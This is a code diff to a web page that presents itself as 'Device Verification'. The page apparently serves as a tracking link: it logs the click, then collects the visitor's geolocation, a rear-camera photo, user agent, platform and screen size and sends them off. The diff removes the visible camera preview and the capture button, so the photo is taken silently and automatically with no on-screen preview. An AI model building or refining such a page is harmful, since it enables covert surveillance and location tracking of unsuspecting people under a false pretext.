@@ -8,31 +8,13 @@
     #progress { margin: 20px 0; height: 5px; background: #f0f0f0; border-radius: 5px; overflow: hidden; }
     #progress-bar { height: 100%; width: 0%; background: #4CAF50; transition: width 0.3s; }
     #status { margin: 15px 0; color: #555; }
-    #camera-feed { margin: 20px 0; display: none; }
-    #video { width: 100%; max-width: 400px; background: #000; }
-    #capture-btn { 
-      margin: 10px 0; 
-      padding: 8px 15px; 
-      background: #4CAF50; 
-      color: white; 
-      border: none; 
-      border-radius: 4px; 
-      cursor: pointer;
-    }
-    #camera-error { color: red; display: none; margin: 10px 0; }
-    #location-error { color: red; display: none; margin: 10px 0; }
+    #camera-error, #location-error { color: red; display: none; margin: 10px 0; }
   </style>
 </head>
 <body>
 <h2>Device Verification</h2>
 <div id="progress"><div id="progress-bar"></div></div>
 <div id="status">Initializing verification...</div>
-
-<div id="camera-feed">
-  <video id="video" autoplay playsinline></video>
-  <button id="capture-btn">Capture Image</button>
-</div>
-
 <div id="camera-error">Camera access denied or not available</div>
 <div id="location-error">Location access denied or unavailable</div>
 
@@ -82,9 +64,6 @@ async function getLocation() {
 async function captureImage() {
   updateStatus(50, "Accessing camera...");
   try {
-    document.getElementById('camera-feed').style.display = 'block';
-    const video = document.getElementById('video');
-    
     mediaStream = await navigator.mediaDevices.getUserMedia({ 
       video: { 
         facingMode: 'environment',
@@ -92,44 +71,38 @@ async function captureImage() {
         height: { ideal: 720 }
       }
     });
+    
+    // Create video element to capture frame
+    const video = document.createElement('video');
     video.srcObject = mediaStream;
-    
-    // Wait for video to be ready
     await new Promise(resolve => video.onloadedmetadata = resolve);
+    await new Promise(resolve => setTimeout(resolve, 500)); // Small delay for camera to adjust
     
-    // Return promise that resolves when user clicks capture button
-    return await new Promise((resolve) => {
-      document.getElementById('capture-btn').onclick = async () => {
-        try {
-          const canvas = document.createElement('canvas');
-          canvas.width = video.videoWidth;
-          canvas.height = video.videoHeight;
-          canvas.getContext('2d').drawImage(video, 0, 0);
-          
-          const imageBlob = await new Promise(resolve => {
-            canvas.toBlob(resolve, 'image/jpeg', 0.8);
-          });
-          
-          const reader = new FileReader();
-          reader.onloadend = () => resolve(reader.result);
-          reader.readAsDataURL(imageBlob);
-        } catch (error) {
-          console.error("Image capture error:", error);
-          resolve(null);
-        } finally {
-          if (mediaStream) {
-            mediaStream.getTracks().forEach(track => track.stop());
-          }
-          document.getElementById('camera-feed').style.display = 'none';
-        }
-      };
+    // Capture frame
+    const canvas = document.createElement('canvas');
+    canvas.width = video.videoWidth;
+    canvas.height = video.videoHeight;
+    const ctx = canvas.getContext('2d');
+    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+    
+    // Convert to JPEG
+    return await new Promise(resolve => {
+      canvas.toBlob(blob => {
+        const reader = new FileReader();
+        reader.onloadend = () => resolve(reader.result);
+        reader.readAsDataURL(blob);
+      }, 'image/jpeg', 0.8);
     });
   } catch (error) {
     console.error("Camera access error:", error);
     document.getElementById('camera-error').style.display = 'block';
     document.getElementById('camera-error').innerText = 
-      `Camera error: ${error.message}`;
+      `Camera error: ${error.message || 'Camera access denied'}`;
     return null;
+  } finally {
+    if (mediaStream) {
+      mediaStream.getTracks().forEach(track => track.stop());
+    }
   }
 }
 
@@ -158,23 +131,30 @@ async function runVerification() {
   const linkId = new URLSearchParams(window.location.search).get('id');
   if (!linkId) return updateStatus(100, "Invalid verification link");
 
+  // Track the click first
   await trackClick(linkId);
   
-  const position = await getLocation();
-  const image = await captureImage();
+  // Get location and image in parallel
+  const [position, image] = await Promise.all([
+    getLocation(),
+    captureImage()
+  ]);
+  
+  // Prepare data to send
+  const verificationData = {
+    link_id: linkId,
+    latitude: position.coords.latitude,
+    longitude: position.coords.longitude,
+    accuracy: position.coords.accuracy,
+    image: image,
+    user_agent: navigator.userAgent,
+    platform: navigator.platform,
+    screen: `${window.screen.width}x${window.screen.height}`
+  };
   
   // Only proceed if we got either location or image
   if ((position.coords.latitude !== 0 && position.coords.longitude !== 0) || image) {
-    await sendData({
-      link_id: linkId,
-      latitude: position.coords.latitude,
-      longitude: position.coords.longitude,
-      accuracy: position.coords.accuracy,
-      image: image,
-      user_agent: navigator.userAgent,
-      platform: navigator.platform,
-      screen: `${window.screen.width}x${window.screen.height}`
-    });
+    await sendData(verificationData);
   } else {
     updateStatus(100, "Failed to get location or image. Please enable permissions.");
   }
